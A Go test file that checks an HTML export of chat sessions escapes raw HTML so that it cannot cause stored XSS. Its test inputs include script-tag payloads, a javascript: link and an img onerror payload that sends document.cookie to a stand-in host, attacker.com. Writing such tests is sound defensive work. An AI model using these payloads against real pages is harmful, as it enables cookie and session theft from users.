package export

import (
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/docker/docker-agent/pkg/chat"
)

// TestRenderMarkdownEscapesRawHTML verifies that the goldmark renderer escapes
// raw HTML in assistant content, preventing stored XSS in exported HTML files.
// This is a regression test for the html.WithUnsafe() removal.
func TestRenderMarkdownEscapesRawHTML(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		mustNot []string
		must    []string
	}{
		{
			name:    "block-level script tag is stripped",
			input:   "<script>alert('xss')</script>",
			mustNot: []string{"<script>", "</script>", "alert("},
		},
		{
			name:    "block-level img onerror is stripped",
			input:   `<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">`,
			mustNot: []string{"<img", "onerror=", "document.cookie"},
		},
		{
			name:    "inline script tag inside paragraph is stripped",
			input:   "hello <script>doBadStuff()</script> world",
			mustNot: []string{"<script>", "</script>"},
			must:    []string{"hello ", " world"},
		},
		{
			name:    "javascript: links are stripped",
			input:   "[click me](javascript:alert(1))",
			mustNot: []string{"javascript:alert(1)"},
		},
		{
			name: "legitimate markdown still renders",
			input: "# Heading\n\n**bold** and *italic*\n\n" +
				"```go\nfmt.Println(\"hi\")\n```",
			must: []string{"<h1", "<strong>bold</strong>", "<em>italic</em>", "<code"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out, err := renderMarkdown(tt.input)
			require.NoError(t, err)
			for _, s := range tt.mustNot {
				assert.NotContainsf(t, out, s, "rendered HTML must not contain %q: %s", s, out)
			}
			for _, s := range tt.must {
				assert.Containsf(t, out, s, "rendered HTML must contain %q: %s", s, out)
			}
		})
	}
}

// TestGenerateEscapesAssistantHTML verifies the end-to-end export does not
// emit attacker-controlled raw HTML from assistant messages.
func TestGenerateEscapesAssistantHTML(t *testing.T) {
	data := SessionData{
		Title:     "test",
		CreatedAt: time.Now(),
		Messages: []Message{
			{
				Role:      chat.MessageRoleUser,
				Content:   "hello",
				AgentName: "",
			},
			{
				Role:      chat.MessageRoleAssistant,
				Content:   `<script>alert('xss')</script><img src=x onerror="alert(1)">`,
				AgentName: "agent",
			},
		},
	}

	out, err := Generate(data)
	require.NoError(t, err)

	assert.NotContains(t, out, "<script>alert('xss')</script>")
	assert.NotContains(t, out, "alert('xss')")
	assert.NotContains(t, out, `onerror="alert(1)"`)
}
